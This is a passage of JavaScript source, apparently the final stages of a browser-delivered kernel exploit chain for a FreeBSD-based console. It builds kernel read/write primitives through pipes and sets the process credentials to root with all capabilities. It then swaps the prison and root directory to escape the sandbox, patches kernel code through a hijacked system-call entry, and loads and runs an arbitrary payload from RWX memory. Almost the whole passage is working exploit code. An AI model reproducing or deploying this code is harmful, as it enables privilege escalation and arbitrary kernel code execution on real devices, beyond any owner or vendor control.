              if (!now || now.low >>> 0 !== 0 || now.hi >>> 0 !== 0) {
                mark("RTHDR-NULL-FAILED", "fd=" + fd + " opts=" + opts + " was=" + was + " still=" + now);
                return "writefail";
              }
              return was && (was.low >>> 0 || was.hi >>> 0) ? "nulled" : "already0";
            };
            for (const fd of [
              masterPipe[0],
              masterPipe[1],
              slavePipe[0],
              slavePipe[1]
            ])
              sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
            const kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
            const kvViewAb = new ArrayBuffer(64);
            keepAlive2.push(kvBufAb, kvViewAb);
            const kvBufAddr = bufAddr(kvBufAb), kvBufDv = new DataView(kvBufAb);
            const kvViewAddr = bufAddr(kvViewAb), kvViewDv = new DataView(kvViewAb);
            new Uint8Array(kvBufAb).fill(0);
            kvBufDv.setUint32(12, PIPE_PAGE, true);
            kv = {
              flush: function() {
                sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
                sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
              },
              kread: function(dst, src, n) {
                put(kvBufDv, 16, src);
                kvBufDv.setUint32(0, n >>> 0, true);
                this.flush();
                return sc(SYS.read, slavePipe[0], dst, n).i32;
              },
              kwrite: function(dst, src, n) {
                put(kvBufDv, 16, dst);
                kvBufDv.setUint32(0, n >>> 0, true);
                this.flush();
                return sc(SYS.write, slavePipe[1], src, n).i32;
              },
              read8: function(a) {
                new Uint8Array(kvViewAb).fill(0);
                this.kread(kvViewAddr, a, 8);
                return new int64(
                  kvViewDv.getUint32(0, true),
                  kvViewDv.getUint32(4, true)
                );
              }
            };
            mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);
            new Uint8Array(kvViewAb).fill(0);
            kv.kread(kvViewAddr, kernelBase, 16);
            const hdr = [];
            for (let i = 0; i < 16; ++i) hdr.push(kvViewDv.getUint8(i));
            mark("KV-READ", "kernel_base -> " + hdr.map((v) => v.toString(16).padStart(2, "0")).join(" "));
            const kvElfOk = check(
              "kernelview-reads-kernel-elf-header",
              kvViewDv.getUint32(0, true) === 1179403647,
              ""
            );
            const fpM2 = kv.read8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
            const fpS2 = kv.read8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
            const same = (a, b) => a && b && a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
            mark("KV-FGET", "master=" + fpM2 + " kread=" + mFp + " slave=" + fpS2 + " kread=" + sFp);
            const kvAgree = check(
              "primitives-agree-pipes-struct-file",
              same(fpM2, mFp) && same(fpS2, sFp),
              ""
            );
            if (!kvElfOk || !kvAgree) {
              mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0) + " agree=" + (kvAgree ? 1 : 0) + " -- repair still runs, later stages self-gate");
            }
            const kvwAb = new ArrayBuffer(16);
            keepAlive2.push(kvwAb);
            const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
            const dmpAb = new ArrayBuffer(32);
            keepAlive2.push(dmpAb);
            const dmpAddr = bufAddr(dmpAb), dmpDv = new DataView(dmpAb);
            const dmpU8 = new Uint8Array(dmpAb);
            const scanAbDump = new ArrayBuffer(128 * FILEDESCENT_SIZE);
            keepAlive2.push(scanAbDump);
            const scanAddrDump = bufAddr(scanAbDump);
            const scanDvDump = new DataView(scanAbDump);
            const kptr2 = (v) => v && v.hi >>> 0 >= 4294901760;
            const fget = (fd) => kv.read8(
              fdtOfiles.add32(fd * FILEDESCENT_SIZE)
            );
            {
              const held = [];
              let allOk = true;
              for (const fd of [
                masterPipe[0],
                masterPipe[1],
                slavePipe[0],
                slavePipe[1]
              ]) {
                const fp = fget(fd);
                if (!kptr2(fp)) {
                  allOk = false;
                  held.push(fd + ":badfp");
                  continue;
                }
                const r = fhold(fp);
                if (!(r.after > r.before)) allOk = false;
                held.push(fd + ":" + r.before + "->" + r.after);
              }
              mark("PIPE-REFCNT", held.join(" "));
              check(
                "four-karw-pipe-files-hold",
                allOk,
                ""
              );
            }
            let jailbreakThrew = null;
            let jailbroken = false, curproc = null;
            try {
              const FIOSETOWN = 2147772028;
              const P_LIST_NEXT = 0, P_UCRED = 64, P_FD = 72, P_PID = 176;
              const CR_UID = 4, CR_RUID = 8, CR_SVUID = 12;
              const CR_NGROUPS = 16, CR_RGID = 20;
              const CR_PRISON = 48, CR_SCECAPS1 = 96, CR_SCECAPS0 = 104;
              const FD_RDIR = 16, FD_JDIR = 24;
              state("sandbox escape...", "warn");
              {
                if (sc(SYS.pipe, argAddr).i32 !== -1) {
                  const escPipe = [
                    argDv.getInt32(0, true),
                    argDv.getInt32(4, true)
                  ];
                  lenDv.setUint32(0, pid, true);
                  sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                  const escFp = fget(escPipe[0]);
                  const escData = kptr2(escFp) ? kv.read8(escFp) : null;
                  const sigio = kptr2(escData) ? kv.read8(escData.add32(208)) : null;
                  curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                  sc(SYS.close, escPipe[1]);
                  sc(SYS.close, escPipe[0]);
                }
                mark("CURPROC", "" + (curproc || "null"));
                check(
                  "curproc-resolved-through-pipe-sigio",
                  kptr2(curproc),
                  "" + (curproc || "null")
                );
              }
              if (kptr2(curproc)) {
                let pfind = function(target) {
                  let q = kv.read8(curproc);
                  for (let n = 0; n < 4096; ++n) {
                    if (!kptr2(q)) return null;
                    if (kview(q).getInt32(P_PID) === target) return q;
                    q = kv.read8(q.add32(P_LIST_NEXT));
                  }
                  return null;
                };
                const kProc = pfind(0);
                const procFd = kv.read8(curproc.add32(P_FD));
                const ucred = kv.read8(curproc.add32(P_UCRED));
                mark("JAILBREAK-SOURCES", "kproc=" + (kProc || "null") + " p_fd=" + procFd + " p_ucred=" + ucred);
                const prison0 = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON)) : null;
                const rootVnode = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR)) : null;
                const srcOk = kptr2(procFd) && kptr2(ucred) && kptr2(prison0) && kptr2(rootVnode);
                mark("JAILBREAK-KSRC", "prison0=" + (prison0 || "null") + " rootvnode=" + (rootVnode || "null"));
                if (check(
                  "jailbreak-source-kernel-pointer",
                  srcOk,
                  srcOk ? "" : "refusing to write"
                )) {
                  kview(ucred).setInt32(CR_UID, 0);
                  kview(ucred).setInt32(CR_RUID, 0);
                  kview(ucred).setInt32(CR_SVUID, 0);
                  kview(ucred).setInt32(CR_NGROUPS, 1);
                  kview(ucred).setInt32(CR_RGID, 0);
                  kview(ucred).setBInt(CR_PRISON, prison0);
                  kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                  kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
                  kview(procFd).setBInt(FD_RDIR, rootVnode);
                  kview(procFd).setBInt(FD_JDIR, rootVnode);
                  const uidNow = sc(SYS.getuid).i32;
                  jailbroken = uidNow === 0;
                  mark("JAILBROKEN", "uid=" + uidNow + " prison0=" + kview(ucred).getBInt(CR_PRISON) + " fd_rdir=" + kview(procFd).getBInt(FD_RDIR));
                  check(
                    "kernel-reports-root",
                    jailbroken,
                    "getuid=" + uidNow
                  );
                }
              }
            } catch (e) {
              jailbreakThrew = e && e.message ? e.message : "" + e;
              mark("JAILBREAK-THREW", jailbreakThrew + " -- continuing to cleanup");
            }
            const dumpOpts = [];
            {
              const res = triplets.map((fd) => fd + ":" + removeRthdrFromSocket(fd));
              mark("TRIPLET-RTHDR", res.join(" "));
              check(
                "triplet-ip6po_rthdr-nulled",
                res.every((r) => r.endsWith("nulled") || r.endsWith("already0")),
                res.join(" ")
              );
            }
            if (burned.size) {
              const bres = [], cleared = [];
              for (const fd of burned) {
                const r = removeRthdrFromSocket(fd);
                bres.push(fd + ":" + r);
                if (r === "nulled" || r === "already0") cleared.push(fd);
              }
              for (const fd of cleared) burned.delete(fd);
              mark("BURNED-REPAIRED", bres.join(" ") + "  still_burned=" + burned.size);
              check(
                "burned-sockets-repaired",
                burned.size === 0,
                burned.size ? [...burned].join(",") : ""
              );
              if (burned.size) rebootRequired = true;
            }
            state("remove_uaf_file...", "warn");
            const uafFp = fget(uafSock);
            uafFpSaved = uafFp;
            mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
            if (kptr2(uafFp)) {
              const r = fhold(uafFp);
              let maxHeld = 0;
              for (const fd of ipv6) if (fd > maxHeld) maxHeld = fd;
              for (const fd of [
                masterPipe[0],
                masterPipe[1],
                slavePipe[0],
                slavePipe[1],
                iovSs[0],
                iovSs[1],
                uioSs[0],
                uioSs[1],
                uafSock
              ])
                if (fd > maxHeld) maxHeld = fd;
              const SCAN_MAX2 = Math.min(2048, maxHeld + 1);
              mark("UAF-SCAN-BOUND", "max_held_fd=" + maxHeld + " scan_max=" + SCAN_MAX2 + " was=2048");
              const CHUNK_FDS = function() {
                const cap = PIPE_PAGE / FILEDESCENT_SIZE >> 1;
                const n = params.has("scanchunk") ? parseInt(params.get("scanchunk"), 10) : 512;
                if ((n | 0) === n && n >= 1 && n <= cap) return n;
                if (params.has("scanchunk"))
                  mark("SCANCHUNK-CLAMPED", "given=" + params.get("scanchunk") + " cap=" + cap + " using=0x200");
                return 512;
              }();
              const CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
              const scanAb = new ArrayBuffer(CHUNK_BYTES);
              keepAlive2.push(scanAb);
              const scanAddr = bufAddr(scanAb);
              const scanDv = new DataView(scanAb);
              const wantLo = uafFp.low >>> 0, wantHi = uafFp.hi >>> 0;
              let nulled = 0, bulkChunks = 0, slowChunks = 0;
              const fds = [];
              for (let base = 0; base < SCAN_MAX2; base += CHUNK_FDS) {
                const nFds = Math.min(CHUNK_FDS, SCAN_MAX2 - base);
                const nBytes = nFds * FILEDESCENT_SIZE;
                const rv = kv.kread(
                  scanAddr,
                  fdtOfiles.add32(base * FILEDESCENT_SIZE),
                  nBytes
                );
                if (rv === nBytes) {
                  bulkChunks++;
                  for (let i = 0; i < nFds; ++i) {
                    const o = i * FILEDESCENT_SIZE;
                    if (scanDv.getUint32(o, true) === wantLo && scanDv.getUint32(o + 4, true) === wantHi) {
                      const fd = base + i;
                      fput(fd, new int64(0, 0));
                      nulled++;
                      fds.push(fd);
                    }
                  }
                } else {
                  slowChunks++;
                  for (let i = 0; i < nFds; ++i) {
                    const fd = base + i;
                    if (same(fget(fd), uafFp)) {
                      fput(fd, new int64(0, 0));
                      nulled++;
                      fds.push(fd);
                    }
                  }
                }
                await new Promise((done) => setTimeout(done, 0));
              }
              mark("UAF-SCAN", "chunks=" + CHUNK_FDS + "fd bulk=" + bulkChunks + " fellback=" + slowChunks + " syscalls=" + (bulkChunks * 2 + slowChunks * CHUNK_FDS * 2));
              uafSock = 0;
              const DRAIN_CAP = function() {
                const n = params.has("drain") ? parseInt(params.get("drain"), 10) : 1536;
                return (n | 0) === n && n >= 0 && n <= 8192 ? n : 1536;
              }();
              const DRAIN_EXPECT = 3, DRAIN_BATCH = 128;
              let zoneClean = true;
              if (DRAIN_CAP > 0) {
                const dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
                keepAlive2.push(dAb);
                const dAddr = bufAddr(dAb), dDv = new DataView(dAb);
                const oneAb = new ArrayBuffer(8);
                keepAlive2.push(oneAb);
                const oneAddr = bufAddr(oneAb), oneDv = new DataView(oneAb);
                const wLo = uafFp.low >>> 0, wHi = uafFp.hi >>> 0;
                const held = [], hitFds = [];
                let scanned2 = 0, batches = 0, moved = 0, emfile = false;
                let ofl = fdtOfiles;
                const dl = Date.now() + 15e3;
                while (scanned2 < DRAIN_CAP && hitFds.length < DRAIN_EXPECT && Date.now() < dl) {
                  const batch = [];
                  for (let i = 0; i < DRAIN_BATCH && scanned2 < DRAIN_CAP; ++i) {
                    const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                    if (fd === -1) {
                      emfile = true;
                      break;
                    }
                    batch.push(fd);
                    held.push(fd);
                    scanned2++;
                  }
                  if (!batch.length) break;
                  batches++;
                  const fresh = kv.read8(kqFdp);
                  if (kptr2(fresh) && !(fresh.low === ofl.low && fresh.hi === ofl.hi)) {
                    ofl = fresh;
                    moved++;
                  }
                  const lo = batch[0], hi = batch[batch.length - 1];
                  const span = (hi - lo + 1) * FILEDESCENT_SIZE;
                  let bulk = false;
                  if (span > 0 && span <= dAb.byteLength) {
                    bulk = kv.kread(
                      dAddr,
                      ofl.add32(lo * FILEDESCENT_SIZE),
                      span
                    ) === span;
                  }
                  for (const fd of batch) {
                    let flo, fhi;
                    if (bulk) {
                      const o = (fd - lo) * FILEDESCENT_SIZE;
                      flo = dDv.getUint32(o, true) >>> 0;
                      fhi = dDv.getUint32(o + 4, true) >>> 0;
                    } else {
                      if (kv.kread(
                        oneAddr,
                        ofl.add32(fd * FILEDESCENT_SIZE),
                        8
                      ) !== 8)
                        continue;
                      flo = oneDv.getUint32(0, true) >>> 0;
                      fhi = oneDv.getUint32(4, true) >>> 0;
                    }
                    if (flo === wLo && fhi === wHi) hitFds.push(fd);
                  }
                  await new Promise((done) => setTimeout(done, 0));
                }
                let nulledHits = 0;
                for (const fd of hitFds) {
                  oneDv.setUint32(0, 0, true);
                  oneDv.setUint32(4, 0, true);
                  kv.kwrite(ofl.add32(fd * FILEDESCENT_SIZE), oneAddr, 8);
                  if (kv.kread(
                    oneAddr,
                    ofl.add32(fd * FILEDESCENT_SIZE),
                    8
                  ) === 8 && oneDv.getUint32(0, true) === 0 && oneDv.getUint32(4, true) === 0) nulledHits++;
                  sc(SYS.close, fd);
                }
                for (const fd of held)
                  if (hitFds.indexOf(fd) < 0) sc(SYS.close, fd);
                mark("ZONE-DRAIN", "scanned=" + scanned2 + "/" + DRAIN_CAP + " batches=" + batches + " hits=" + hitFds.length + "/" + DRAIN_EXPECT + (hitFds.length ? " at_fds=" + hitFds.join(",") : "") + " nulled=" + nulledHits + " ofiles_moved=" + moved + (emfile ? " EMFILE" : ""));
                check(
                  "file-zone-duplicates-drained",
                  hitFds.length === DRAIN_EXPECT && nulledHits === hitFds.length,
                  "found " + hitFds.length + " of " + DRAIN_EXPECT + ", nulled " + nulledHits
                );
                if (hitFds.length !== DRAIN_EXPECT || nulledHits !== hitFds.length) {
                  rebootRequired = true;
                  zoneClean = false;
                }
                const vfds = [];
                let vhits = 0;
                for (let i = 0; i < 16; ++i) {
                  const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                  if (fd === -1) break;
                  vfds.push(fd);
                }
                const vres = kv.read8(kqFdp);
                const vofl = kptr2(vres) ? vres : ofl;
                for (const fd of vfds) {
                  if (kv.kread(
                    oneAddr,
                    vofl.add32(fd * FILEDESCENT_SIZE),
                    8
                  ) !== 8) {
                    sc(SYS.close, fd);
                    continue;
                  }
                  if (oneDv.getUint32(0, true) >>> 0 === wLo && oneDv.getUint32(4, true) >>> 0 === wHi) {
                    vhits++;
                    oneDv.setUint32(0, 0, true);
                    oneDv.setUint32(4, 0, true);
                    kv.kwrite(
                      vofl.add32(fd * FILEDESCENT_SIZE),
                      oneAddr,
                      8
                    );
                  }
                  sc(SYS.close, fd);
                }
                mark("ZONE-VERIFY", "alloc=" + vfds.length + " residual_hits=" + vhits);
                check(
                  "freed-file-not-reissued-by-falloc",
                  vhits === 0,
                  vhits ? "still reissued after the drain" : ""
                );
                if (vhits) {
                  rebootRequired = true;
                  zoneClean = false;
                }
              }
              mark("UAF-REMOVED", "fhold=" + r.before + "->" + r.after + " nulled=" + nulled + "/" + SCAN_MAX2 + " fds=" + fds.join(","));
              check(
                "alias-freed-file-nulled",
                nulled > 0,
                "nulled=" + nulled
              );
              const clean = nulled > 0 && zoneClean;
              if (clean) rebootRequired = false;
              else mark("STILL-DIRTY", "reboot=1 fdtable=" + (nulled > 0 ? "ok" : "FAILED") + " zone=" + (zoneClean ? "ok" : "FAILED"));
            } else {
              check(
                "uaf_sock-struct-file-readable",
                false,
                "fp=" + uafFp
              );
            }
            {
              let closed = 0, heldBack = 0;
              for (const fd of ipv6) {
                if (burned.has(fd)) {
                  heldBack++;
                  continue;
                }
                if (sc(SYS.close, fd).i32 === 0) closed++;
              }
              for (const fd of [iovSs[0], iovSs[1], uioSs[0], uioSs[1]])
                if (sc(SYS.close, fd).i32 === 0) closed++;
              mark("SOCKETS-CLOSED", "n=" + closed + "/" + (ipv6.length + 4) + (heldBack ? "  held_back_burned=" + heldBack : ""));
            }
            await restoreThreadAttrs("cleanup");
            let kpatched = false;
            if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
              state("kernel patches...", "warn");
              const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 44;
              const sysent = kernelBase.add32(off.k_sysent_661);
              const gadget = kernelBase.add32(off.k_jmp_rsi);
              const gb = [];
              for (let i = 0; i < 4; ++i) {
                new Uint8Array(kvwAb).fill(0);
                kv.kread(kvwAddr, gadget.add32(i), 1);
                gb.push(kvwDv.getUint8(0));
              }
              mark("JMP-RSI-BYTES", gadget + " -> " + gb.map((v) => v.toString(16).padStart(2, "0")).join(" "));
              const gadgetOk = gb[0] === 255 && gb[1] === 38;
              const oNarg = kview(sysent).getInt32(SYSENT_NARG);
              const oCall = kview(sysent).getBInt(SYSENT_CALL);
              const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
              mark("SYSENT-661", "narg=" + oNarg + " thrcnt=" + oThr + " sy_call=" + oCall);
              const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);
              const siteBytes = [];
              let sitesOk = true;
              for (const s of KPATCH_JMP_SITES) {
                new Uint8Array(kvwAb).fill(0);
                kv.kread(kvwAddr, kernelBase.add32(s), 1);
                const b = kvwDv.getUint8(0);
                siteBytes.push(hx(s) + ":" + b.toString(16));
                if (!(b >= 112 && b <= 127 || b === 235)) sitesOk = false;
              }
              mark("KPATCH-SITES", siteBytes.join(" "));
              check(
                "gadget-sysent661-patch-sites-look-right",
                gadgetOk && sysentOk && sitesOk,
                "gadget=" + gadgetOk + " sysent=" + sysentOk + " sites=" + sitesOk
              );
              if (gadgetOk && sysentOk && sitesOk) {
                const jitFd = sc(SYS.jitshm_create, 0, 16384, 7).i32;
                const KEXEC_MAP = new int64(537919488, 9);
                const mapped = sc(
                  SYS.mmap,
                  KEXEC_MAP,
                  16384,
                  7,
                  17,
                  jitFd,
                  0
                );
                const mapAddr = new int64(mapped.lo, mapped.hi);
                mark("KPATCH-MAP", "jitshm_create=" + jitFd + " mmap=" + mapAddr);
                if (mapAddr.hi > 0) {
                  for (let i = 0; i < kpatch.length; ++i)
                    p.write1(mapAddr.add32(i), kpatch[i]);
                  let copied = true;
                  for (let i = 0; i < kpatch.length; ++i)
                    if (p.read1(mapAddr.add32(i)) !== kpatch[i]) {
                      copied = false;
                      break;
                    }
                  check(
                    "blob-rwx-memory-byte-byte",
                    copied,
                    kpatch.length + " bytes"
                  );
                  if (copied) {
                    kview(sysent).setInt32(SYSENT_NARG, 2);
                    kview(sysent).setBInt(SYSENT_CALL, gadget);
                    kview(sysent).setInt32(SYSENT_THRCNT, 1);
                    const armedOk = same(kview(sysent).getBInt(SYSENT_CALL), gadget);
                    mark("SYSENT-ARMED", "sy_call=" + gadget + (armedOk ? "" : " MISMATCH"));
                    if (armedOk) {
                      let rc = -1;
                      try {
                        rc = sc(SYS.kexec, mapAddr).i32;
                      } finally {
                        kview(sysent).setInt32(SYSENT_NARG, oNarg);
                        kview(sysent).setBInt(SYSENT_CALL, oCall);
                        kview(sysent).setInt32(SYSENT_THRCNT, oThr);
                        const back = same(
                          kview(sysent).getBInt(SYSENT_CALL),
                          oCall
                        );
                        if (!back) mark(
                          "SYSENT-NOT-RESTORED",
                          "sy_call still " + kview(sysent).getBInt(SYSENT_CALL) + " -- syscall 661 is armed system-wide"
                        );
                      }
                      const verify = [];
                      let allEb = true;
                      for (const s of KPATCH_JMP_SITES) {
                        new Uint8Array(kvwAb).fill(0);
                        kv.kread(kvwAddr, kernelBase.add32(s), 1);
                        const b = kvwDv.getUint8(0);
                        verify.push(hx(s) + ":" + b.toString(16));
                        if (b !== 235) allEb = false;
                      }
                      mark("KEXEC", "arg=" + mapAddr + " rc=" + rc + " sysent=restored");
                      mark("KPATCH-VERIFY", verify.join(" "));
                      kpatched = rc === 0 && allEb;
                      check(
                        "gated-site-reads-0xeb",
                        allEb,
                        ""
                      );
                      check(
                        "blob-ran-ring-0",
                        rc === 0,
                        "kexec=" + rc
                      );
                      if (kpatched) mark(
                        "KERNEL-PATCHED",
                        "sites=" + KPATCH_JMP_SITES.length
                      );
                    }
                  }
                }
              }
            } else if (jailbroken) {
              mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0) + " sites=" + KPATCH_JMP_SITES.length);
            }
            if (rebootRequired) {
              mark("PAYLOAD-SKIPPED", "cleanup incomplete / zone dirty -- reboot required");
            } else if (payload && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
              state("payload...", "warn");
              const sz = payload.length + 16383 & ~16383;
              const m2 = sc(SYS.mmap, 0, sz, 7, 4098, -1, 0);
              const entry = new int64(m2.lo, m2.hi);
              mark("PAYLOAD-MAP", "size=0x" + sz.toString(16) + " rwx=" + entry);
              if (entry.hi > 0) {
                for (let i = 0; i < payload.length; ++i)
                  p.write1(entry.add32(i), payload[i]);
                let bad = -1;
                for (let i = 0; i < payload.length; ++i)
                  if (p.read1(entry.add32(i)) !== payload[i]) {
                    bad = i;
                    break;
                  }
                check(
                  "byte-payload-rwx-memory",
                  bad < 0,
                  bad < 0 ? "" : "mismatch at +" + hx(bad)
                );
                if (bad < 0 && off.wk___imp_pthread_create !== void 0) {
                  const slot = webkitBase.add32(off.wk___imp_pthread_create);
                  const fn = p.read8(slot);
                  const expect = libkernelBase.add32(off.k_pthread_create);
                  const agree = same(fn, expect);
                  mark("PTHREAD-TABLE", "got=" + fn + " table=" + expect + " agree=" + (agree ? 1 : 0));
                  if (agree) {
                    const thr = new ArrayBuffer(8);
                    keepAlive2.push(thr);
                    const thrAddr = bufAddr(thr);
                    new Uint8Array(thr).fill(0);
                    const rc = callAddr(
                      expect,
                      [thrAddr, 0, entry, 0]
                    ).i32;
                    const handle = new int64(
                      new DataView(thr).getUint32(0, true),
                      new DataView(thr).getUint32(4, true)
                    );
                    payloadRunning = rc === 0 && handle.hi > 0;
                    mark("PTHREAD-CREATE", "rc=" + rc + " handle=" + handle);
                    check(
                      "payload-thread-created",
                      payloadRunning,
                      ""
                    );
                    if (payloadRunning) {
                      mark(
                        "PAYLOAD-RUNNING",
                        "bytes=" + payload.length + " entry=" + entry
                      );
                      hostOk();
                    }
                  }
                }
              }
            }
            if (params.get("dump") !== "0") {
              try {
                const kq = (v) => v && v.hi >>> 0 >= 4294901760;
                const rd8 = (a) => kq(a) ? kv.read8(a) : null;
                const rd32 = function(a) {
                  if (!kq(a)) return null;
                  dmpU8.fill(0);
                  if (kv.kread(dmpAddr, a, 4) !== 4) return null;
                  return dmpDv.getInt32(0, true);
                };
                const pf = [];
                for (const fd of [
                  masterPipe[0],
                  masterPipe[1],
                  slavePipe[0],
                  slavePipe[1]
                ]) {
                  const fp = fget(fd);
                  pf.push(fd + ":" + (kq(fp) ? "fc=" + rd32(fp.add32(40)) : "nofp"));
                }
                mark("DUMP-PIPE-FCOUNT", pf.join(" "));
                for (const [nm, fd] of [
                  ["master", masterPipe[0]],
                  ["slave", slavePipe[0]]
                ]) {
                  const fp = fget(fd);
                  const fdata = rd8(fp);
                  if (!kq(fdata)) {
                    mark("DUMP-PIPEBUF", nm + " nofdata");
                    continue;
                  }
                  dmpU8.fill(0);
                  const okr = kv.kread(dmpAddr, fdata, 24) === 24;
                  mark("DUMP-PIPEBUF", nm + " @" + fdata + (okr ? "  cnt=" + dmpDv.getUint32(0, true) + " in=" + dmpDv.getUint32(4, true) + " out=" + dmpDv.getUint32(8, true) + " size=0x" + dmpDv.getUint32(12, true).toString(16) + " buffer=" + new int64(
                    dmpDv.getUint32(16, true),
                    dmpDv.getUint32(20, true)
                  ) : "  READ-FAILED"));
                }
                const to = [];
                for (const e of dumpOpts) {
                  const r = rd8(e.opts.add32(104));
                  const pi = rd8(e.opts.add32(16));
                  to.push("fd" + e.fd + "@" + e.opts + " rthdr=" + (r || "?") + " pktinfo=" + (pi || "?"));
                }
                mark("DUMP-TRIPLET-OPTS", to.length ? to.join("  ") : "none");
                const uf = typeof uafFpSaved !== "undefined" ? uafFpSaved : null;
                if (kq(uf)) {
                  mark("DUMP-UAF-FILE", "fp=" + uf + " f_count=" + rd32(uf.add32(40)) + " f_data=" + (rd8(uf) || "?"));
                }
                if (kq(uf) && kq(fdtOfiles)) {
                  let hits = 0, lastFd = -1;
                  const wl = uf.low >>> 0, wh = uf.hi >>> 0;
                  const nfd = Math.min(1024, typeof SCAN_MAX !== "undefined" ? SCAN_MAX + 64 : 1024);
                  for (let base = 0; base < nfd; base += 128) {
                    const n = Math.min(128, nfd - base);
                    if (kv.kread(
                      scanAddrDump,
                      fdtOfiles.add32(base * FILEDESCENT_SIZE),
                      n * FILEDESCENT_SIZE
                    ) !== n * FILEDESCENT_SIZE) break;
                    for (let i = 0; i < n; ++i) {
                      const o = i * FILEDESCENT_SIZE;
                      if (scanDvDump.getUint32(o, true) === wl && scanDvDump.getUint32(o + 4, true) === wh) {
                        hits++;
                        lastFd = base + i;
                      }
                    }
                  }
                  mark("DUMP-UAF-REFS", "slots_still_pointing_at_it=" + hits + (hits ? " last_fd=" + lastFd : "") + "  scanned=" + nfd);
                }
                if (kq(curproc)) {
                  const uc = rd8(curproc.add32(64));
                  const pfd = rd8(curproc.add32(72));
                  mark("DUMP-PROC", "curproc=" + curproc + " ucred=" + (uc || "?") + (kq(uc) ? " cr_ref=" + rd32(uc.add32(0)) + " uid=" + rd32(uc.add32(4)) + " prison=" + (rd8(uc.add32(48)) || "?") : "") + " p_fd=" + (pfd || "?"));
                  if (kq(pfd))
                    mark("DUMP-FILEDESC", "fd_cdir=" + (rd8(pfd.add32(16)) || "?") + " fd_rdir=" + (rd8(pfd.add32(24)) || "?") + " fd_jdir=" + (rd8(pfd.add32(32)) || "?"));
                }
                mark("DUMP-DONE", "read-only, no kernel writes");
              } catch (e) {
                mark("DUMP-THREW", e && e.message ? e.message : String(e));
              }
            }
            mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken + " kpatched=" + kpatched + " payload=" + payloadRunning + " cleanup=" + (rebootRequired ? "incomplete" : "complete"));
            allDone = payloadRunning && !rebootRequired;
          }
        }
      }
      mark("STEP10-SUMMARY", "committed=" + committed + " reboot=" + rebootRequired + " triplets=" + (triplets ? triplets.join(",") : "none") + " kernel_base=" + (kernelBase || "none") + " kq_fdp=" + (kqFdp || "none") + " kv=" + (kv ? "up" : "down"));
      if (!kv) {
        const stage = !committed ? "not-armed" : !triplets ? "triple-free" : !kernelBase ? "leak-kqueue" : "make-karw";
        mark("FAILED-STAGE", "stage=" + stage + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
      }
      state(allDone ? "ALL DONE" : kv ? "KERNEL R/W -- REBOOT NEEDED" : kernelBase ? "FAILED IN make_karw -- REBOOT" : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT" : committed ? "FAILED IN triple free -- REBOOT" : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
      if (!payloadRunning) {
        hostFail();
      }
    } catch (e) {
      mark("STEP10-FAILED", e && e.message ? e.message : String(e));
      state("FAILED -- see log", "bad");
      hostFail();
    } finally {
      if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
      try {
        if (restoreCtx) await restoreCtx.restore("finally");
      } catch (e) {
        mark("THREAD-ATTRS-RESTORE-THREW", e.message);
      }
      for (const w of workers) {
        try {
          if (w.armed) {
            await w.rpc("disarm", 5e3);
            w.armed = false;
          }
        } catch (e) {
          mark("DISARM-THREW", w.name + " " + e.message);
        }
      }
      for (const w of workers) {
        try {
          if (w.wired && w.master && w.origVector && p) {
            p.write8(w.master.add32(16), w.origVector);
            w.wired = false;
          }
        } catch (e) {
        }
      }
      for (const w of workers) {
        try {
          w.worker.terminate();
        } catch (e) {
        }
      }
      try {
        if (mainArmed && mainMf && mainOrig && p) {
          p.write8(mainMf, mainOrig);
          mainArmed = false;
          mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
        }
      } catch (e) {
        mark("DISARM-THREW", e.message);
      }
      if (rebootRequired)
        mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
    }
  })();
})();
